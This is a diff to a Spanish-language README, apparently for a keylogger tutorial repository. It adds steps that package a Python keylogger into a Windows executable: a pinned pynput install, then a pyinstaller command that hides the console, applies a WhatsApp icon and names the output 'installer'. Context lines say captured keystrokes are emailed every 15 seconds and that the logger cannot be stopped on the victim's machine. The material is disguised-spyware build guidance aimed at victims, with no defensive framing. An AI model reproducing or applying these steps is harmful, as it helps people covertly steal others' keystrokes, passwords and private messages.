@@ -309,6 +309,55 @@ log.start()
 *  Si lo seteamos a 15 seg cada 15 seg recibimos el email.
 # IMPORTANTE: El keylogger lo paramos mediante CTRL+C en el terminal nuestro, pero en la maquina dela victima por ex: NO SE PUEDE PARAR!
 
+# Keylogger '.exe
+
+
+```bash
+* pip install pynput (Importante: necesitamos pynput 1.6.8)
+```
+
+* Comprueba tu version:
+
+```bash
+pip freeze
+```
+
+* Instalar 1.6.8
+
+```bash
+pip install pynput==1.6.8
+```
+
+# Tambien se necesita pyinstaller
+```bash
+pip install pyinstaller
+```
+
+
+# Creamos el ejecutable .Exe
+
+```bash
+pyinstaller --onefile -windowed --noconsole -i=whatsapp.ico log.py --name installer
+```
+
+* En el anterior repo mio (Backdoor Laboratorio) > explico en detalle cada uno de los comandos.
+
+
+![adm de tareas](https://user-images.githubusercontent.com/97669969/159286830-b26c4e84-0cb5-497f-bf9b-600d48582681.png)
+
+
+![Captura de pantalla de 2022-03-21 15-24-00](https://user-images.githubusercontent.com/97669969/159286841-07d0c514-bb80-47b9-b84b-2d9957d02909.png)
+
+![corre envio ubuntu](https://user-images.githubusercontent.com/97669969/159286886-da1ced18-a7ca-4e56-8659-d1df7324ffa2.png)
+
+
+![Captura de pantalla de 2022-03-21 15-24-22](https://user-images.githubusercontent.com/97669969/159286894-32b6a976-b53e-4f5c-a991-e8187e89d80a.png)
+
+
+![Captura de pantalla de 2022-03-21 15-24-33](https://user-images.githubusercontent.com/97669969/159286904-3980fb6a-7295-4a24-86ea-d1988a699d29.png)
+
+
+
 
 
 
